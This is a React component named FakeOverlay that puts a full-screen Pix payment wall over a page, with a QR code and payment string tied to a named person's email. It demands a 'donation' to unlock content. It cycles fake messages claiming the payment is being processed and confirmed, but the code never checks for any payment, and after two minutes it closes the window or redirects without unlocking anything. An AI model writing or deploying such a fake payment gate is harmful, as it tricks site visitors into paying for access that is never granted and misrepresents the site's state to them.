import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

export function FakeOverlay() {
  const [, setLocation] = useLocation();
  const [messageIndex, setMessageIndex] = useState(0);

  const messages = [
    "Estabelecendo conexão segura",
    "Aguardando pagamento",
    "Processando pagamento",
    "Aguardando pagamento",
    "Aguardando na tela até o pagamento ser efetivado",
    "Confirmando..."
  ];

  useEffect(() => {
    // 2 minutes as requested
    const delay = 120000;
    
    const timer = setTimeout(() => {
      try {
        window.close();
        setTimeout(() => {
          setLocation("/");
        }, 200);
      } catch (error) {
        setLocation("/");
      }
    }, delay);

    // Message rotation logic
    const interval = setInterval(() => {
      setMessageIndex((prev) => (prev + 1) % messages.length);
    }, 15000); // Change message every 15 seconds

    document.body.style.overflow = "hidden";

    return () => {
      clearTimeout(timer);
      clearInterval(interval);
      document.body.style.overflow = "auto";
    };
  }, [setLocation]);

  return (
    <div className="fixed inset-0 z-[9999] bg-[#0a0a0a]/95 backdrop-blur-xl flex flex-col items-center justify-center text-white p-6">
      <motion.div
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.5 }}
        className="flex flex-col items-center max-w-lg w-full text-center bg-[#111] p-10 rounded-2xl border border-white/10 shadow-2xl"
      >
        <div className="mb-8 flex flex-col items-center">
          <img 
            src="https://user-images.githubusercontent.com/741969/99538133-492fe280-298b-11eb-81a2-66779343e064.png" 
            alt="Pix" 
            className="w-16 h-16 mb-4 object-contain"
          />
          <div className="bg-white p-4 rounded-xl mb-4">
            <img 
              src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent("00020126770014BR.GOV.BCB.PIX0127pedro.emanoeltech@gmail.com0224pagamento para liberação5204000053039865802BR5925Pedro Emanoel de Oliveira6009SAO PAULO62140510m5DrixK1YV63046DEB")}`}
              alt="QR Code Pix"
              className="w-48 h-48"
            />
          </div>
          <p className="text-xs text-gray-500 break-all font-mono bg-black/30 p-2 rounded border border-white/5 select-all">
            00020126770014BR.GOV.BCB.PIX0127pedro.emanoeltech@gmail.com0224pagamento para liberação5204000053039865802BR5925Pedro Emanoel de Oliveira6009SAO PAULO62140510m5DrixK1YV63046DEB
          </p>
        </div>
        
        <h2 className="text-xl md:text-2xl font-bold mb-4 text-white">
          Para liberar o conteudo é necessario fazer um doação de no minimo R$1,00 Reais apos o pagamento será libera o acesso
        </h2>
        
        <p className="text-blue-400 font-medium mb-8 animate-pulse">
          aguardando pagamento
        </p>
        
        <div className="flex items-center justify-center gap-3 text-sm text-gray-400 font-mono bg-white/5 py-3 px-6 rounded-full border border-white/10 min-w-[280px]">
          <Loader2 className="w-4 h-4 animate-spin text-blue-500" />
          <AnimatePresence mode="wait">
            <motion.span
              key={messages[messageIndex]}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.3 }}
            >
              {messages[messageIndex]}
            </motion.span>
          </AnimatePresence>
        </div>
      </motion.div>
    </div>
  );
}
